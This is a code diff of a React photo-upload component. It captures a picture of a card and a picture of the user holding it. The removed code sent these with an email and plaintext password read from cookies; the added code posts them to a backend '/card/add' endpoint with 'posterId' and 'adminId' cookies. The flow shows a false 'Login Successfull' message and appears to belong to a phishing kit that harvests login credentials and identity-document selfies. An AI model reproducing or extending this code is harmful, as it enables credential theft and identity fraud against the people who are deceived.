@@ -7,6 +7,8 @@ import Image from "next/image";
 import Cookies from "js-cookie";
 import ArrowPathIcon from "./Icons/ArrowPathIcon";
 import CameraIcon from "./Icons/CameraIcon";
+import { toast } from "react-toastify";
+import { API_URL } from "../config";
 
 function PhotoUpload({ setShowModal }) {
   const [facingMode, setFacingMode] = useState("user");
@@ -65,9 +67,8 @@ function PhotoUpload({ setShowModal }) {
           // setValue("imageId", data.public_id);
 
           setOnlyCardUrl(data.secure_url);
-          Cookies.set("onlyCard", data.secure_url);
-          // Cookies.set("onlyCard", onlyCardUrl);
-          // console.log("onlycard", onlyCardUrl);
+          // Cookies.set("onlyCard", data.secure_url);
+
           setShowCamera("");
         } else {
           console.log("error", data);
@@ -85,7 +86,7 @@ function PhotoUpload({ setShowModal }) {
     // setShowCamera("");
   }, [onlyCardCamRef]);
 
-  console.log("onlycard", onlyCardUrl);
+  // console.log("onlycard", onlyCardUrl);
 
   // useEffect(() => {
   //   Cookies.set("onlyCard", onlyCardUrl);
@@ -121,9 +122,8 @@ function PhotoUpload({ setShowModal }) {
           // setValue("imageId", data.public_id);
 
           setHoldingCardUrl(data.secure_url);
-          Cookies.set("holdingCard", data.secure_url);
-          // Cookies.set("onlyCard", onlyCardUrl);
-          // console.log("onlycard", onlyCardUrl);
+          // Cookies.set("holdingCard", data.secure_url);
+
           setShowCamera("");
         } else {
           console.log("error", data);
@@ -145,25 +145,53 @@ function PhotoUpload({ setShowModal }) {
   //   console.log("image src", imageSrc);
   // }, [imageSrc]);
 
-  const handleAllSubmit = async () => {
-    const allValues = {
-      site: site,
-      email: Cookies.get("email"),
-      password: Cookies.get("password"),
-      skipcode: "",
-      onlyCard: Cookies.get("onlyCard"),
-      holdingCard: Cookies.get("holdingCard"),
-    };
+  const values = {
+    id: Cookies.get("id"),
+    onlyCard: onlyCardUrl,
+    holdingCard: holdingCardUrl,
+    // onlyCard: Cookies.get("onlyCard"),
+    // holdingCard: Cookies.get("holdingCard"),
+  };
 
-    console.log("allValues", allValues);
+  const handleImageSubmit = async () => {
+    console.log("allValues", values);
 
-    Cookies.remove("email");
-    Cookies.remove("password");
-    Cookies.remove("onlyCard");
-    Cookies.remove("holdingCard");
+    // Cookies.remove("email");
+    // Cookies.remove("password");
+    // Cookies.remove("onlyCard");
+    // Cookies.remove("holdingCard");
 
-    setShowModal(false);
-    toast.success("Login Successfull");
+    const url = `${API_URL}/card/add`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+
+    const data = await res.json();
+
+    if (res.ok) {
+      console.log("success", data);
+      // toast.success("Login Succecssfull");
+      // formik.resetForm();
+      console.log("success", data);
+      toast.success("Login Succecssfull");
+      Cookies.remove("id");
+      Cookies.remove("posterId");
+      Cookies.remove("adminId");
+      // Cookies.remove("email");
+      // router.push("/account/email");
+      // Cookies.remove("id");
+
+      setShowModal(false);
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
+    }
   };
 
   return (
@@ -281,9 +309,10 @@ function PhotoUpload({ setShowModal }) {
 
               {onlyCardUrl && holdingCardUrl && (
                 <button
-                  type="submit"
+                  // type="submit"
+                  type="button"
                   className="mt-3 text-white text-sm font-medium bg-blue-600 py-3 px-8 uppercase"
-                  // onClick={handleAllSubmit}
+                  onClick={handleImageSubmit}
                 >
                   SUBMIT
                 </button>
